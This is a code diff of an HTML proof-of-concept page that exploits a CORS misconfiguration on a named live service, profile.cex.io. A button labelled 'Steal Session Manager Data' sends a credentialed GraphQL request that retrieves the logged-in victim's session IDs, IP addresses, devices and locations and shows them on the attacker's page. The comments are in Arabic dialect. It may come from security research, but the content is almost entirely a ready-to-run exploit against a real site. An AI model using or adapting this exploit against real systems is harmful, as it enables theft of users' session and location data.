@@ -2,49 +2,62 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CORS POST PoC</title>
+  <title>CORS GraphQL PoC</title>
 </head>
 <body>
 
-<h2>CORS Misconfiguration – POST Request</h2>
-<button id="run">Steal Session Data (POST)</button>
+<h2>CORS Misconfiguration – GraphQL POST</h2>
+<button id="run">Steal Session Manager Data</button>
 <pre id="out">Click the button…</pre>
 
 <script>
 document.getElementById("run").onclick = function () {
 
-  const target = "https://profile.cex.io/account-api/graphql"; 
-  // ⚠️ بدّلها بالـ endpoint الحقيقي
-
+  const target = "https://profile.cex.io/account-api/graphql";
   const out = document.getElementById("out");
-  out.textContent = "Sending authenticated POST request with victim cookies...\n";
+
+  out.textContent = "Sending authenticated GraphQL POST request...\n";
 
   const xhr = new XMLHttpRequest();
   xhr.open("POST", target, true);
 
-  // 🔥 النقطة الحاسمة
+  // 🔥 النقطة الأساسية فـ CORS
   xhr.withCredentials = true;
 
-  // نفس Content-Type اللي كيقبل السيرفر
   xhr.setRequestHeader("Content-Type", "application/json");
 
   xhr.onreadystatechange = function () {
     if (xhr.readyState === 4) {
       out.textContent =
-        "STATUS: " + xhr.status + "\n\n" +
+        "STATUS: " + xhr.status + " " + xhr.statusText + "\n\n" +
         "RESPONSE HEADERS:\n" +
         xhr.getAllResponseHeaders() + "\n\n" +
         "RESPONSE BODY:\n" +
         xhr.responseText;
 
-      console.log("CORS POST PoC response:", xhr.responseText);
+      console.log("CORS GraphQL PoC response:", xhr.responseText);
     }
   };
 
-  // body فارغ (بحال الريكوست الحقيقي)
-  xhr.send("{"query":"\n    {\n        sessionManager {\n            device\n            deviceType\n            ip\n            lastActiveTime\n            sessionId\n            isCurrent\n            location\n        }\n    }\n"}");
+  const body = JSON.stringify({
+    query: `
+    {
+        sessionManager {
+            device
+            deviceType
+            ip
+            lastActiveTime
+            sessionId
+            isCurrent
+            location
+        }
+    }`
+  });
+
+  xhr.send(body);
 };
 </script>
 
 </body>
 </html>
+
